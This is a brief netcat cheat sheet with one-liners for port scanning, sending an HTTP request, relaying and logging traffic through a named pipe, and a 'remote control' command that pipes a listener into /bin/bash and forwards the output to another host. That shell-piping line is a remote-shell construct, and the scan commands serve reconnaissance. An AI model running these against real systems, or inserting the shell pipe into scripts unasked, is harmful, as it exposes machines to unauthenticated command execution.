# Netcat

PORT SCANNING
The -z flag can be used to tell nc to report open ports, rather than initiate a connection. Usually it's useful to turn on verbose output to stderr by use this option in conjunction with -v option.
```
$ nc -zv 192.168.0.1 1-1024 2>&1 | grep "succeeded"
```

TALKING TO SERVERS
```
echo "GET / HTTP/1.1\r\nHost: api.ipify.org\r\n\r\n" -n | nc -N api.ipify.org 80
```

REMOTE CONTROL
```
nc -l 5000 | /bin/bash 2>&1 | nc 192.168.0.39 5001
```

Proxy with logging
//mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
```
$ mknod backpipe p ; nc -l -p 1337 < backpipe | tee -a inflow | sudo nc 127.0.0.1 1338 | tee -a outflow 1> backpipe

$ mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe                                           # Port Relay
$ mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe      # Proxy (Port 80 to 8080)
$ mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
```

Scan the target’s specified port range:
```
echo "" | nc -v -n -w1 <target> <port-range>
```